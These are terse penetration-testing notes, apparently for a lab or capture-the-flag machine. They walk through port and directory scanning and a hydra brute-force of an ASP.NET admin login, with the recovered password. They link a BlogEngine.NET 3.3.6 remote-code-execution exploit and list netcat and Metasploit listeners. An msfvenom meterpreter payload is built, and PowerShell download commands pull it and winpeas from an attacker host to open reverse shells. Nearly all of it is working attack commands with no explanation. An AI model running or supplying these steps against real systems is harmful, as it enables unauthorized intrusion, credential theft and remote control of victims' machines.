10.10.54.169

nmap -T4 -p- -n 10.10.54.169

gobuster dir -w /root/Desktop/Tools/wordlists/dirbuster/directory-list-2.3-small.txt -u 10.10.54.169

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.54.169 http-post-form  "__VIEWSTATE=E%2ByTaVuTQY0JGp3LLCzpmCHJG2ahj4d2DjoI6S0C%2FUZfXykYmoK2I4nCa2GbZnrZUbzVgwhDMKliObxbG8FL0SR71BmHVavSKWplhxjD%2BqSWIGg3NSQ2RuXMjMg%2F2Y80JJ4q7EDdhy%2F88Cchb92GmysKvL0fv%2Bjv3iwjhWtfz5k1XTiP&__EVENTVALIDATION=DZXN7Vav25MAxzf17jzNZjthD5a3KJ9vGIYkrEsA5%2F%2FzWPWRb4R7LlCeDgEbx2eqfRX1gS61ixK5NpPN%2B0eCqLrhZ6ojwWYWC99ii78eZE8v8NeTjgkDMlzZj%2B1YjornoTJ4SpDLr6k7HWClagkWU30hMb3KpNkFp0Ocpp6BeMSMTl5O&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=asdrf&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in"

admin:1qaz2wsx

[BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution - ASPX webapps Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/46353)

copy exploit code and follow directions in the comment section
Dont forget to update to attacker IP and port - used 9001

nc -lvnp 9001

msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64  LHOST=10.13.41.202 LPORT=9002 -f exe > shell-x64.exe

python3 -m http.server 8001

cd c:\windows\temp
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.41.202:8001/shell-x64.exe','shell-x64.exe')"



msfconsole -q -x 'use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter/reverse_tcp;set LHOST 10.13.41.202;set LPORT 9002;run -j'

use exploit/multi/handler 
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.13.41.202
set LPORT 9002
run -j
sessions -i 1

powershell start-process "shell-x64.exe"

get to shell and run winpeas and review


powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.41.202:8001/winpeasx64.exe','winpeasx64.exe')"